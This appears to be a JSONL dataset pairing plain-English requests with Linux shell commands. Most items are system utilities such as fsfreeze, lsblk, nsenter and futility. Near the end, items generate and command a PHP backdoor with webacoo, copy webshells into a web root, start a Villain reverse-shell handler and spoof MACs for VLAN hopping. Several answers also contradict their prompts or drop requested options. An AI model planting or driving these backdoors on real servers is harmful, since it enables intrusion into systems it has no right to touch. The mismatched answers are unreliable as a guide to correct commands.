{"input": "Check all filesystems, serialize the operations, and do not execute any repairs; just show what would be done", "answer": "fsck -AsN"}
{"input": "Freeze the filesystem mounted at `/mnt/data` to suspend all access to it", "answer": "fsfreeze --freeze /mnt/data"}
{"input": "Unfreeze the filesystem mounted at `/var/log` to resume normal operations", "answer": "fsfreeze --unfreeze /var/log"}
{"input": "Suspend access to the filesystem mounted at `/home/user` to prepare for a system snapshot", "answer": "fsfreeze -f /home/user"}
{"input": "Resume access to the filesystem mounted at `/backup` after completing a backup process", "answer": "fsfreeze -u /backup"}
{"input": "Freeze the filesystem at `/mnt/backup` to ensure no changes are made during a critical system update", "answer": "fsfreeze --freeze /mnt/backup"}
{"input": "Unfreeze the filesystem at `/mnt/temp` after completing a data migration task", "answer": "fsfreeze --unfreeze /mnt/temp"}
{"input": "Resume access to the filesystem at `/mnt/storage` after finishing a system maintenance task", "answer": "fsfreeze -u /mnt/storage"}
{"input": "Trim all mounted filesystems to discard unused blocks", "answer": "fstrim -a"}
{"input": "Trim all filesystems listed in `/etc/fstab` to free up unused space", "answer": "fstrim -A"}
{"input": "Parse the command-line options for a script that uses short options `-x`, `-y`, and `-z`, and reports errors under the name `my_script`, with the parameters `input.txt` and `output.txt`", "answer": "getopt -o xyz -n my_script -- input.txt output.txt"}
{"input": "Parse the command-line options for a script that uses short options `-m`, `-n`, and `-p`, and suppresses error reporting, with the parameters `data1.csv` and `data2.csv`", "answer": "getopt -o mnp -q -- data1.csv data2.csv"}
{"input": "Parse the command-line options for a script that uses short options `-d`, `-e`, and `-f`, and sets the quoting conventions to those of the `bash` shell, with the parameters `config.json` and `settings.ini`", "answer": "getopt -o def -s bash -- config.json settings.ini"}
{"input": "Minimize the number of hardlinks in `/var/www/html` while ignoring timestamps and file modes, and perform a dry run to preview the changes", "answer": "hardlink -n /var/www/html"}
{"input": "Run a program in a 32-bit environment with address space randomization disabled and verbose output enabled", "answer": "setarch i386 -R ./my_program --verbose"}
{"input": "Launch a program in a 32-bit environment with address space randomization disabled and whole seconds enabled", "answer": "setarch i386 -R ./my_program"}
{"input": "Execute a binary in a 32-bit environment with sticky timeouts and verbose output enabled", "answer": "linux32 ./binary"}
{"input": "Set the I/O scheduling class to \"best-effort\" with a priority of 3 for the command `compress_files.sh`", "answer": "ionice -c 2 -n 3 ./compress_files.sh"}
{"input": "Create a shared memory segment of 1 GiB with default permissions", "answer": "ipcmk -M 1G"}
{"input": "Create a shared memory segment of 512 MiB with read and write permissions for the owner only", "answer": "ipcmk -M 512M -p 0600"}
{"input": "Create a message queue with read and write permissions for the owner and group only", "answer": "ipcmk -Q -p 0660"}
{"input": "Create a shared memory segment of 100 KiB with read-only permissions for everyone", "answer": "ipcmk -M 100K -p 0444"}
{"input": "Create a shared memory segment of 500 MiB with read and write permissions for the owner and read-only permissions for the group", "answer": "ipcmk -M 500M -p 0640"}
{"input": "Remove all IPC resources (shared memory, message queues, and semaphores) using `ipcrm`", "answer": "ipcrm -a"}
{"input": "Display the length of the ISO file \"opensuse.iso\" in bytes and show the sector count and size", "answer": "isosize -x opensuse.iso"}
{"input": "Execute a 32-bit program with function pointers pointing to descriptors and enable verbose output to see which options are being applied", "answer": "linux32 -v /path/to/program"}
{"input": "Execute a 32-bit program with the uname 2.6 personality flag and verbose output to confirm the applied options", "answer": "linux32 --uname-2.6 -v /path/to/program"}
{"input": "Run a program in a 32-bit environment with address space randomization disabled", "answer": "setarch i386 -R /path/to/program"}
{"input": "Execute a program with a 3 GB address space limit and enable verbose output to see which options are being applied", "answer": "ulimit -v 3145728 && /path/to/program --verbose"}
{"input": "Run a program with function pointers pointing to descriptors and disable virtual memory allocation randomization", "answer": "setarch $(uname -m) -R /path/to/program"}
{"input": "List all block devices and output the information in JSON format", "answer": "lsblk -a -J"}
{"input": "Display all block devices, including empty ones, and sort the output by device name", "answer": "lsblk -a -x NAME"}
{"input": "Show all block devices, including empty ones, and output the information in raw format", "answer": "lsblk -a -r"}
{"input": "Display all block devices, including empty ones, and print the discard capabilities", "answer": "lsblk -a -D"}
{"input": "Show all block devices, including empty ones, and use key=\"value\" output format", "answer": "lsblk -a -P"}
{"input": "List all block devices, including empty ones, and exclude devices with major number 7", "answer": "lsblk -a -e 7"}
{"input": "Show all block devices, including empty ones, and output information about permissions", "answer": "lsblk -a -m"}
{"input": "Display CPU architecture information in JSON format, including both online and offline CPUs", "answer": "lscpu -a -J"}
{"input": "Show all semaphores in the system, including the number of semaphores and the time of the last operation", "answer": "lsipc -s -o NSEMS,OTIME"}
{"input": "Show all semaphores, including the number of semaphores and the time of the last operation, in ISO date format", "answer": "lsipc -s -o NSEMS,OTIME --time-format=iso"}
{"input": "List all locks on the system, including all available columns, and display the output in a human-readable format", "answer": "lslocks --output-all"}
{"input": "List all locks on the system, but only display the columns for PID, type, and size", "answer": "lslocks --output PID,TYPE,SIZE"}
{"input": "List all system accounts with their user IDs, primary group IDs, and last login information", "answer": "lslogins -s --output=USER,UID,GID,LAST-LOGIN"}
{"input": "Display all users with their password expiration dates in ISO format", "answer": "lslogins --output=USER,PWD-EXPIR --time-format=iso"}
{"input": "Show all memory blocks without headings, including their removable status and NUMA node information", "answer": "lsmem -a -n -o REMOVABLE,NODE"}
{"input": "List all memory blocks, including a summary of the memory information at the end of the output", "answer": "lsmem -a --summary=always"}
{"input": "List all namespaces on the system, including all available columns", "answer": "lsns --output-all"}
{"input": "List all namespaces of type 'net' (network namespaces)", "answer": "lsns --type net"}
{"input": "Show all namespaces without printing the column headings", "answer": "lsns --noheadings"}
{"input": "Generate a magic cookie for xauth without using any seed file or size limit", "answer": "mcookie"}
{"input": "Create an ext2 filesystem on `/dev/sdd1` without specifying the filesystem type explicitly", "answer": "mkfs.ext2 /dev/sdd1"}
{"input": "Create an ext4 filesystem on `/dev/sdi1` and specify the number of inodes to be 50000", "answer": "mkfs -t ext4 -N 50000 /dev/sdi1"}
{"input": "Create a swap area on `/dev/sdf1` with verbose output and lock the device exclusively during the operation", "answer": "mkswap --verbose --lock=yes /dev/sdf1"}
{"input": "Set up a swap area on `/dev/sdg1` with a label `swap2` and specify the size of the swap area as 512MB", "answer": "mkswap -L swap2 /dev/sdg1"}
{"input": "Display the contents of \"application.log\" in the terminal, but show help information instead of ringing the bell", "answer": "more -d application.log"}
{"input": "View the file \"network.log\" in the terminal, but suppress underlining and bold text formatting", "answer": "cat network.log"}
{"input": "Determine if `/var/log` is a mountpoint and print the major and minor device numbers of the filesystem", "answer": "mountpoint -d /var/log"}
{"input": "Follow the path `/etc/passwd` without resolving symbolic links and show the owner and group of each component", "answer": "namei -n -o /etc/passwd"}
{"input": "Enter all namespaces of the process with PID 12345 and run the command `/bin/bash` within those namespaces", "answer": "nsenter -a -t 12345 /bin/bash"}
{"input": "Enter all namespaces of the process with PID 11223, retain capabilities granted in user namespaces, and run the command `/usr/bin/id` to display user and group information", "answer": "nsenter -a -t 11223 --keep-caps /usr/bin/id"}
{"input": "Enter all namespaces of the process with PID 55667, set the SELinux context according to the target process, and run the command `/bin/cat /etc/passwd`", "answer": "nsenter -a -t 55667 -Z /bin/cat /etc/passwd"}
{"input": "Enter all namespaces of the process with PID 77889, do not fork before executing the command `/bin/ps aux`, and display the process list", "answer": "nsenter -a -t 77889 -F /bin/ps aux"}
{"input": "Add all partitions on the disk `/dev/sda` to the kernel's partition table", "answer": "partx -a /dev/sda"}
{"input": "Update all partitions on the disk `/dev/sdc` in the kernel's partition table", "answer": "partx -u /dev/sdc"}
{"input": "Add partitions 2 to 4 on the disk `/dev/sde` to the kernel's partition table", "answer": "partx -a --nr 2:4 /dev/sde"}
{"input": "Add all partitions on the disk `/dev/sdk` and enable verbose mode for detailed output", "answer": "partx -a -v /dev/sdk"}
{"input": "Show all partitions on the disk `/dev/sdl` and output only the partition number, start sector, and size", "answer": "partx -s -o NR,START,SIZE /dev/sdl"}
{"input": "How do I pivot the root filesystem to `/mnt/newroot` and store the old root at `/mnt/oldroot`?", "answer": "pivot_root /mnt/newroot /mnt/oldroot"}
{"input": "Set the maximum CPU time limit to 60 seconds for the process with PID 5678", "answer": "prlimit -p 5678 --cpu=60"}
{"input": "Display the resource limits for the process with PID 242526 in verbose mode", "answer": "prlimit -p 242526 --verbose"}
{"input": "Display all kernel profiling symbols, including those with a count of 0, using the default map and profile files", "answer": "readprofile -a"}
{"input": "Print all kernel profiling symbols, including those with a count of 0, and provide verbose output for detailed information", "answer": "readprofile -a -v"}
{"input": "Display all kernel profiling symbols, including those with a count of 0, and reset all counters afterward", "answer": "readprofile -a -r"}
{"input": "Print all kernel profiling symbols, including those with a count of 0, and specify a custom map file located at `/boot/custom.map`", "answer": "readprofile -a -m /boot/custom.map"}
{"input": "Resize partition number 3 on the disk device `/dev/sda` to a new length of 50000 sectors", "answer": "resizepart /dev/sda 3 50000"}
{"input": "Update the size of partition number 1 on `/dev/sdb` to 250000 sectors", "answer": "resizepart /dev/sdb 1 250000"}
{"input": "Change the size of partition number 2 on `/dev/nvme0n1` to 100000 sectors", "answer": "resizepart /dev/nvme0n1 2 100000"}
{"input": "Set the size of partition number 6 on `/dev/sde` to 150000 sectors", "answer": "resizepart /dev/sde 6 150000"}
{"input": "Resize partition number 7 on `/dev/sdf` to 200000 sectors", "answer": "resizepart /dev/sdf 7 200000"}
{"input": "Update the size of partition number 8 on `/dev/sdg` to 500000 sectors", "answer": "resizepart /dev/sdg 8 500000"}
{"input": "Resize partition number 10 on `/dev/sdi` to 600000 sectors", "answer": "resizepart /dev/sdi 10 600000"}
{"input": "Reverse the characters in each line of a file and search for a specific pattern using `grep`", "answer": "rev input.txt | grep \"pattern\""}
{"input": "Reverse the characters in each line of a file and display only the first 10 lines using `head`", "answer": "rev input.txt | head -n 10"}
{"input": "Put the system into standby mode and wake it up after 3600 seconds using the default RTC device", "answer": "rtcwake -m standby -s 3600"}
{"input": "Schedule the system to wake up at a specific timestamp in UTC time using the RTC device rtc1", "answer": "rtcwake -m mem -t 1698768000 -u -d rtc1"}
{"input": "Schedule the system to wake up at a specific time using UTC and enable verbose output for debugging", "answer": "rtcwake -m standby -t 1701388800 -u -v"}
{"input": "Put the system into hibernation mode and wake it up after 7200 seconds, using the RTC device rtc0 and local time", "answer": "rtcwake -m disk -s 7200 -d rtc0 -l"}
{"input": "Test the rtcwake functionality with a wakeup time of 300 seconds, using standby mode and verbose output, but without actually suspending the system", "answer": "rtcwake -m standby -s 300 -n -v"}
{"input": "Schedule the system to wake up at a specific date and time in UTC, using the RTC device rtc2 and verbose output", "answer": "rtcwake -m mem --date \"2024-01-01 00:00:00\" -u -d rtc2 -v"}
{"input": "Start a new shell session as the user `bob` using the `/bin/bash` shell", "answer": "runuser -u bob -s /bin/bash"}
{"input": "Disable address space randomization for a program called `my_program` and limit the address space to 3 GB", "answer": "setarch --addr-no-randomize --3gb my_program"}
{"input": "Run `/usr/bin/example` with the capability bounding set limited to `CAP_NET_BIND_SERVICE` and `CAP_SYS_ADMIN`", "answer": "setpriv --bounding-set cap_net_bind_service,cap_sys_admin /usr/bin/example"}
{"input": "Run `/usr/bin/example` with the parent death signal set to `SIGTERM` and the environment reset to default values", "answer": "setpriv --pdeathsig SIGTERM --reset-env /usr/bin/example"}
{"input": "Execute `/usr/bin/example` with the ambient capabilities set to `CAP_CHOWN` and `CAP_DAC_OVERRIDE`, and the inheritable capabilities set to `CAP_KILL`", "answer": "setpriv --ambient-caps cap_chown,cap_dac_override --inh-caps cap_kill /usr/bin/example"}
{"input": "Run `/usr/bin/example` with the real UID set to `1000`, the effective UID set to `1001`, and the supplementary groups initialized", "answer": "setpriv --ruid 1000 --euid 1001 --init-groups /usr/bin/example"}
{"input": "Set the terminal's foreground color to green and the background color to black", "answer": "setterm --foreground green --background black"}
{"input": "Enable bold text and underline all subsequent text in the terminal", "answer": "echo -e '\\e[1m\\e[4m'"}
{"input": "Start a single-user login session on the terminal device `/dev/tty3` with a login shell, a timeout of 45 seconds, and force password file examination if `getpwnam` fails", "answer": "sulogin -t 45 /dev/tty3"}
{"input": "Change both the label and UUID of the swap area on `/dev/sdd4` to \"primary_swap\" and \"123e4567-e89b-12d3-a456-426614174000\", respectively", "answer": "swaplabel -L primary_swap -U 123e4567-e89b-12d3-a456-426614174000 /dev/sdd4"}
{"input": "Set the label of the swap area on `/dev/sde5` to \"temp_swap\" and verify the changes", "answer": "swaplabel -L temp_swap /dev/sde5 && swaplabel /dev/sde5"}
{"input": "Reset the UUID of the swap area on `/dev/sdf6` to a randomly generated value", "answer": "swaplabel -U $(uuidgen) /dev/sdf6"}
{"input": "Switch the root filesystem to `/newroot` and execute `/usr/bin/init` with the argument `rescue`", "answer": "switch_root /newroot /usr/bin/init rescue"}
{"input": "Set the CPU affinity for all threads of the process with PID 181920 to CPUs 0-3 and 8-11", "answer": "taskset -a -c 0-3,8-11 -p 181920"}
{"input": "Set the minimum utilization clamping value to 600 and the maximum utilization clamping value to 1000 for a new command `/usr/bin/myapp` with arguments `arg1 arg2`", "answer": "uclampset -m 600 -M 1000 /usr/bin/myapp arg1 arg2"}
{"input": "Run a new shell in a completely isolated environment by unsharing all namespaces", "answer": "unshare --mount --uts --ipc --net --pid --user --cgroup --time --fork /bin/bash"}
{"input": "Run a program in a new network and PID namespace, and map the current user to root", "answer": "unshare --net --pid --map-root-user /path/to/program"}
{"input": "Run a program in a new user namespace, automatically mapping users and groups", "answer": "unshare --user --map-auto /path/to/program"}
{"input": "Run a program in a new cgroup namespace and change the working directory to `/tmp`", "answer": "unshare --cgroup --wd=/tmp /path/to/program"}
{"input": "Run a program in a new IPC namespace and set the UID to 1000", "answer": "unshare --ipc --setuid=1000 /path/to/program"}
{"input": "Run a program in a new user namespace, mapping the current user to itself and denying the `setgroups` syscall", "answer": "unshare --user --map-current-user --setgroups=deny /path/to/program"}
{"input": "Show the status of the watchdog device, but exclude any information about the flags", "answer": "wdctl"}
{"input": "Print the watchdog flags and their statuses in a raw output format", "answer": "wdctl -r"}
{"input": "Locate all files for the `chmod` command, but only search in the directories `/usr/bin` and `/usr/local/bin` for binaries", "answer": "whereis -B /usr/bin -B /usr/local/bin -f chmod"}
{"input": "Find all files for the `nano` command, but terminate the directory argument list after specifying `/usr/bin` for binaries", "answer": "whereis -B /usr/bin -f nano"}
{"input": "Locate all files for the `curl` command, but only search in `/usr/local/bin` for binaries and `/usr/share/man` for manual pages", "answer": "whereis -B /usr/local/bin -M /usr/share/man -f curl"}
{"input": "Wipe all signatures from the device `/dev/sdb` without creating a backup", "answer": "wipefs --all /dev/sdb"}
{"input": "Forcefully wipe all signatures from the device `/dev/sdd` without displaying any output messages", "answer": "wipefs --all --force --quiet /dev/sdd"}
{"input": "Find a free zram device and set its size to 1GB using the lz4 compression algorithm", "answer": "zramctl -f -s 1G -a lz4"}
{"input": "Reset all zram devices currently in use", "answer": "zramctl -r $(zramctl --output=NAME --noheadings)"}
{"input": "Show the status of all zram devices without headings and in bytes", "answer": "zramctl --noheadings -b"}
{"input": "List all zram devices showing only the device name, disk size, and compression algorithm used", "answer": "zramctl -o NAME,DISKSIZE,ALGORITHM"}
{"input": "Reserve the device `/dev/sdi` with the key `2223` and set the reservation type to `write-exclusive-reg-only`", "answer": "blkpr --command reserve --key 2223 --type write-exclusive-reg-only /dev/sdi"}
{"input": "Perform a preempt operation on `/dev/sdk` using the old key `2627` and replace it with a new reservation using the key `2829` and the type `exclusive-access-all-regs`", "answer": "blkpr --command preempt --key 2829 --oldkey 2627 --type exclusive-access-all-regs /dev/sdk"}
{"input": "Block the `ioctl` syscall for the `strace` command to prevent it from tracing system calls", "answer": "strace -e '!ioctl' ls"}
{"input": "Verify the integrity of a compressed ROM filesystem at `/dev/sdc1` using a custom block size of 4096 bytes", "answer": "fsck.cramfs -b 4096 /dev/sdc1"}
{"input": "Test the uncompression of a compressed ROM filesystem at `/mnt/cramfs/image.cramfs` without extracting its contents", "answer": "fsck.cramfs /mnt/cramfs/image.cramfs"}
{"input": "Perform a verbose, interactive repair of the Minix filesystem on `/dev/sdh8` and output super-block information", "answer": "fsck.minix -v -r -s /dev/sdh8"}
{"input": "Use the ISA bus to access the hardware clock and display the current time", "answer": "hwclock --show --directisa"}
{"input": "Create an SCO bfs filesystem on `/dev/sde1` with 2000 inodes, a volume name of \"Media\", and enable verbose output. Ignore the `-c` and `-l` options silently", "answer": "mkfs.bfs -v /dev/sde1"}
{"input": "Create an SCO bfs filesystem on `/dev/sdj1` with the default number of inodes, a volume name of \"Backup2\", and use an exclusive device lock in blocking mode", "answer": "mkfs.bfs /dev/sdj1"}
{"input": "Create a compressed ROM filesystem from the directory `/home/user/data` and save it as `output.cramfs`, ensuring all warnings are treated as errors", "answer": "mkfs.cramfs /home/user/data output.cramfs"}
{"input": "Start the UUID generation daemon with a custom socket path and an inactivity timeout of 30 seconds", "answer": "uuidd --socket /var/run/uuidd.sock --timeout 30"}
{"input": "Test time-based UUID generation without creating a PID file", "answer": "uuidd --time --no-pid"}
{"input": "Run the UUID daemon in debug mode and do not daemonize using double-fork", "answer": "uuidd --debug --no-fork"}
{"input": "Request 15 UUIDs using the UUID daemon and specify a custom PID file path", "answer": "uuidd --uuids 15 --pid /var/run/custom_uuidd.pid"}
{"input": "Start the UUID daemon with socket activation and a custom socket path", "answer": "uuidd --socket-activation --socket /tmp/uuidd.sock"}
{"input": "Display the version of the UUID daemon", "answer": "uuidd --version"}
{"input": "Run the UUID daemon without creating a listening socket and with a custom PID file", "answer": "uuidd --no-socket --pid /var/run/uuidd_custom.pid"}
{"input": "Create a UUID using the OID namespace and the name \"2.5.4.3\" with an MD5 hash", "answer": "uuidgen -n @oid -N 2.5.4.3 -m"}
{"input": "Repair the GPT headers and tables on the drive `/dev/sdd`", "answer": "cgpt repair /dev/sdd"}
{"input": "Display the contents of the FMAP from a firmware image file named `firmware.bin`", "answer": "futility dump_fmap firmware.bin"}
{"input": "Pack a custom kernel for a Chrome OS device using the keyblock `my_kernel.keyblock`, private key `my_private_key.vbprivk`, kernel version `5`, kernel image `vmlinuz.bin`, bootloader `bootloader.bin`, and configuration file `config.txt`", "answer": "futility vbutil_kernel --pack signed_kernel.bin --keyblock my_kernel.keyblock --signprivate my_private_key.vbprivk --version 5 --vmlinuz vmlinuz.bin --bootloader bootloader.bin --config config.txt"}
{"input": "Repack an existing kernel blob `old_kernel.blob` with a new private key `new_private_key.vbprivk` and a new configuration file `new_config.txt`", "answer": "futility vbutil_kernel --repack repacked_kernel.bin --signprivate new_private_key.vbprivk --oldblob old_kernel.blob --config new_config.txt"}
{"input": "Pack a kernel and emit only the verification blob instead of the full kernel", "answer": "futility vbutil_kernel --pack signed_kernel.bin --keyblock my_kernel.keyblock --signprivate my_private_key.vbprivk --version 5 --vmlinuz vmlinuz.bin --bootloader bootloader.bin --config config.txt --vblockonly"}
{"input": "Dump the RSA public key from a public key file named `backup_key.pub` located in the `/backup/keys` directory", "answer": "openssl rsa -in /backup/keys/backup_key.pub -pubin -noout -text"}
{"input": "Generate a firmware vblock using the keyblock `fw.keyblock`, the signing private key `signing_key.vbprivk`, firmware version `123`, firmware volume `fw_volume.bin`, and kernel subkey `kernel_key.vbpubk`", "answer": "futility vbutil_firmware --vblock fw_vblock.bin --keyblock fw.keyblock --signprivate signing_key.vbprivk --version 123 --fv fw_volume.bin --kernelkey kernel_key.vbpubk"}
{"input": "Verify the firmware vblock `fw_vblock.bin` using the signing public key `signing_pubkey.vbpubk` and the firmware volume `fw_volume.bin`", "answer": "futility vbutil_firmware --verify fw_vblock.bin --signpubkey signing_pubkey.vbpubk --fv fw_volume.bin"}
{"input": "Generate a firmware vblock with custom preamble flags set to `5` using the keyblock `fw.keyblock`, signing private key `signing_key.vbprivk`, firmware version `456`, firmware volume `fw_volume.bin`, and kernel subkey `kernel_key.vbpubk`", "answer": "futility vbutil_firmware --vblock fw_vblock.bin --keyblock fw.keyblock --signprivate signing_key.vbprivk --version 456 --fv fw_volume.bin --kernelkey kernel_key.vbpubk --flags 5"}
{"input": "Verify the firmware vblock `fw_vblock.bin` using the signing public key `signing_pubkey.vbpubk`, firmware volume `fw_volume.bin`, and extract the kernel subkey to `extracted_kernel_key.vbpubk`", "answer": "futility vbutil_firmware --verify fw_vblock.bin --signpubkey signing_pubkey.vbpubk --fv fw_volume.bin --kernelkey extracted_kernel_key.vbpubk"}
{"input": "Generate a firmware vblock with preamble flags set to `3` using the keyblock `fw.keyblock`, signing private key `signing_key.vbprivk`, firmware version `101`, firmware volume `fw_volume.bin`, and kernel subkey `kernel_key.vbpubk`", "answer": "futility vbutil_firmware --vblock fw_vblock.bin --keyblock fw.keyblock --signprivate signing_key.vbprivk --version 101 --fv fw_volume.bin --kernelkey kernel_key.vbpubk --flags 3"}
{"input": "Verify the firmware vblock `fw_vblock.bin` using the signing public key `signing_pubkey.vbpubk`, firmware volume `fw_volume.bin`, and save the kernel subkey to `kernel_subkey_output.vbpubk`", "answer": "futility vbutil_firmware --verify fw_vblock.bin --signpubkey signing_pubkey.vbpubk --fv fw_volume.bin --kernelkey kernel_subkey_output.vbpubk"}
{"input": "Generate a firmware vblock with preamble flags set to `7` using the keyblock `fw.keyblock`, signing private key `signing_key.vbprivk`, firmware version `202`, firmware volume `fw_volume.bin`, and kernel subkey `kernel_key.vbpubk`", "answer": "futility vbutil_firmware --vblock fw_vblock.bin --keyblock fw.keyblock --signprivate signing_key.vbprivk --version 202 --fv fw_volume.bin --kernelkey kernel_key.vbpubk --flags 7"}
{"input": "Verify the firmware vblock `fw_vblock.bin` using the signing public key `signing_pubkey.vbpubk` and firmware volume `fw_volume.bin`, and extract the kernel subkey to `kernel_subkey.vbpubk`", "answer": "futility vbutil_firmware --verify fw_vblock.bin --signpubkey signing_pubkey.vbpubk --fv fw_volume.bin --kernelkey kernel_subkey.vbpubk"}
{"input": "Pack a keyblock using the data public key `data_pub.vbpubk` and sign it with the private key `sign_priv.vbprivk`, setting the flags to `0x1234`", "answer": "futility vbutil_keyblock --pack keyblock.bin --datapubkey data_pub.vbpubk --signprivate sign_priv.vbprivk --flags 0x1234"}
{"input": "Unpack a keyblock from `keyblock.bin` and verify it using the signing public key `sign_pub.vbpubk`, while extracting the data public key to `extracted_data_pub.vbpubk`", "answer": "futility vbutil_keyblock --unpack keyblock.bin --signpubkey sign_pub.vbpubk --datapubkey extracted_data_pub.vbpubk"}
{"input": "Pack a keyblock using the data public key `data_pub.vbpubk` without signing it, and set the flags to `0x9ABC`", "answer": "futility vbutil_keyblock --pack keyblock.bin --datapubkey data_pub.vbpubk --flags 0x9ABC"}
{"input": "Pack a keyblock using the data public key `data_pub.vbpubk` and sign it using an external signing command `/usr/bin/sign_cmd`, setting the flags to `0xDEF0`", "answer": "futility vbutil_keyblock --pack keyblock.bin --datapubkey data_pub.vbpubk --externalsigner \"/usr/bin/sign_cmd\" --flags 0xDEF0"}
{"input": "Pack a keyblock using the data public key `data_pub.vbpubk` and sign it with the private key `sign_priv.vbprivk`, setting the flags to `0x1234` and using an external signing command `/usr/bin/sign_cmd`", "answer": "futility vbutil_keyblock --pack keyblock.bin --datapubkey data_pub.vbpubk --signprivate sign_priv.vbprivk --externalsigner \"/usr/bin/sign_cmd\" --flags 0x1234"}
{"input": "Start a Villain team server on port 7000, enable insecure connections, and suppress the banner on startup", "answer": "villain -p 7000 -i -q"}
{"input": "Start a Villain server with a reverse TCP multi-handler on port 3333, a file smuggler server on port 7777, and allow insecure connections", "answer": "villain -n 3333 -f 7777 -i"}
{"input": "Launch a Villain server with default settings but suppress the banner and display the program version", "answer": "villain -q -v"}
{"input": "Edit the file \"data.bin\" in binary mode to view and modify raw binary data", "answer": "vim.basic -b data.bin"}
{"input": "Open two files, `file1.txt` and `file2.txt`, in separate vertical splits using Vim's GUI mode", "answer": "vim.gtk3 -g -O2 file1.txt file2.txt"}
{"input": "Open a file named `log.txt` in Vim's GUI mode, and log all startup timing messages to a file named `startup.log`", "answer": "vim.gtk3 -g --startuptime startup.log log.txt"}
{"input": "Start the Vim tutor in German for chapter 1 without using the GUI", "answer": "LANG=de vimtutor"}
{"input": "Launch the Vim tutor in French for chapter 2 using the default interface", "answer": "vimtutor fr"}
{"input": "Start Vim in restricted mode to edit `sensitive.txt` with limited functionality", "answer": "vim -Z sensitive.txt"}
{"input": "Open Vim in silent (batch) mode to execute commands from the script file `commands.vim`", "answer": "vim -s commands.vim"}
{"input": "Open two files, \"file1.txt\" and \"file2.txt\", in separate vertical split windows using Vim", "answer": "vim.nox -O2 file1.txt file2.txt"}
{"input": "Recover a crashed Vim session for the file \"notes.txt\"", "answer": "vim.nox -r notes.txt"}
{"input": "Open Vim and log all typed commands to a file named \"vim_commands.log\"", "answer": "vim.nox -W vim_commands.log"}
{"input": "Open Vim and write startup timing messages to a file named \"startup_times.log\"", "answer": "vim.nox --startuptime startup_times.log"}
{"input": "Open the Vim tutor in English for chapter 2 without the graphical interface", "answer": "vimtutor"}
{"input": "Open the file \"testfile.txt\" in vim.tiny and set the terminal type to \"xterm\" for compatibility", "answer": "vim.tiny -T xterm testfile.txt"}
{"input": "Open the file \"notes.txt\" in vim.tiny and skip the warning if the input/output is not a terminal", "answer": "vim.tiny --not-a-term notes.txt"}
{"input": "Create a hex dump of the file \"logfile.log\" with 8 octets per line, grouped in 4-byte chunks, and start reading from an offset of 512 bytes", "answer": "xxd -c 8 -g 4 -s 512 logfile.log"}
{"input": "Extract thumbnails and metadata from the Thumbs.db file located at /home/user/Thumbs.db, save the output to /home/user/output, and suppress all output messages", "answer": "vinetto -o /home/user/output -q /home/user/Thumbs.db"}
{"input": "List all available interfaces for CDP sniffing using VoIP Hopper", "answer": "voiphopper -l"}
{"input": "Enable Avaya DHCP option mode on the `eth0` interface to simulate an Avaya phone", "answer": "voiphopper -i eth0 -a"}
{"input": "Discover Alcatel VLANs using mode `1` on the `eth0` interface and spoof the MAC address to `00:80:9f:ad:42:42`", "answer": "voiphopper -i eth0 -t 1 -m 00:80:9f:ad:42:42"}
{"input": "Discover Alcatel VLANs using mode `2` on the `eth0` interface, join VLAN 800, and spoof the MAC address to `00:80:9f:ad:42:42`", "answer": "voiphopper -i eth0 -t 2 -v 800 -m 00:80:9f:ad:42:42"}
{"input": "Convert a PCF configuration file named `client_config.pcf` and ensure the output is saved with appropriate permissions", "answer": "pcf2vpnc client_config.pcf client_config.conf && chmod 600 client_config.conf"}
{"input": "Convert a PCF configuration file named `site_to_site.pcf` and save the VPNC configuration to a file named `site_to_site.conf` in the current directory", "answer": "pcf2vpnc site_to_site.pcf ./site_to_site.conf"}
{"input": "Convert a PCF configuration file named `secure_access.pcf` and save the VPNC configuration to a file named `secure_access.conf` in the `/etc/vpnc/` directory with appropriate permissions", "answer": "pcf2vpnc secure_access.pcf /etc/vpnc/secure_access.conf && chmod 600 /etc/vpnc/secure_access.conf"}
{"input": "Print the current configuration of the vpnc client without connecting to any VPN", "answer": "cat /etc/vpnc/default.conf"}
{"input": "Connect to a VPN gateway at `vpn.example.com` using the group name \"remote-team\", group password \"team-secret\", and username \"admin\"", "answer": "vpnc --gateway vpn.example.com --id remote-team --secret team-secret --username admin"}
{"input": "Print the current configuration of the VPN client without connecting", "answer": "cat /etc/vpnc/default.conf"}
{"input": "Scan multiple websites listed in a file named targets.txt for any WAF protection and save the output to a CSV file named results.csv", "answer": "wafw00f -i targets.txt -o results.csv"}
{"input": "Perform a vulnerability scan on `https://example.com` with Wapiti, excluding the URL `https://example.com/admin`, and set the scan depth to 3", "answer": "wapiti -u https://example.com -x https://example.com/admin -d 3"}
{"input": "Scan `https://example.com` using Wapiti with the `sql` and `xss` modules, and save the session data to `/tmp/wapiti_session`", "answer": "wapiti -u https://example.com -m sql,xss --store-session /tmp/wapiti_session"}
{"input": "Scan `https://example.com` using Wapiti with a proxy server at `http://proxy.example.com:8080`, and output the results in JSON format to `output.json`", "answer": "wapiti -u https://example.com -p http://proxy.example.com:8080 -f json -o output.json"}
{"input": "Run a Wapiti scan on `https://example.com` with a maximum of 50 links per page, a maximum of 10 pages per directory, and a maximum scan time of 3600 seconds", "answer": "wapiti -u https://example.com --max-links-per-page 50 --max-files-per-dir 10 --max-scan-time 3600"}
{"input": "Scan `https://example.com` using Wapiti with a custom header `X-Custom-Header: value`, and output the results in XML format to `report.xml`", "answer": "wapiti -u https://example.com -H \"X-Custom-Header: value\" -f xml -o report.xml"}
{"input": "Save the current version of the URL \"https://example.com\" to the Wayback Machine and print the archive URL", "answer": "waybackpy -u https://example.com -s"}
{"input": "List all known archived URLs for \"https://example.com\" using the CDX API", "answer": "waybackpy -u https://example.com --cdx"}
{"input": "Retrieve the archived version of \"https://example.com\" from the year 2020", "answer": "waybackpy -u https://example.com -Y 2020"}
{"input": "List all known archived URLs for \"https://example.com\" and limit the results to 1000 entries", "answer": "waybackpy -u https://example.com --cdx -l 1000"}
{"input": "List all known archived URLs for \"https://example.com\" and use pagination to retrieve the results", "answer": "waybackpy -u https://example.com --cdx -up"}
{"input": "Execute a single command `whoami` on a backdoor located at `http://example.com/backdoor.php` using the `exec` function", "answer": "webacoo -e \"whoami\" -u http://example.com/backdoor.php -f exec"}
{"input": "Generate a backdoor using the `popen` function, return the un-obfuscated code, and save it to a file named `backdoor_unobfuscated.php`", "answer": "webacoo -g -o backdoor_unobfuscated.php"}
{"input": "Set the verbose level to 2 to print HTTP headers and data while establishing a remote terminal connection to a backdoor located at `http://example.com/backdoor.php`", "answer": "webacoo -t -u http://example.com/backdoor.php -v 2"}
{"input": "Copy all PHP webshells from the `/usr/share/webshells/php` directory to a target directory `/var/www/html/backdoor`", "answer": "cp -r /usr/share/webshells/php/* /var/www/html/backdoor/"}
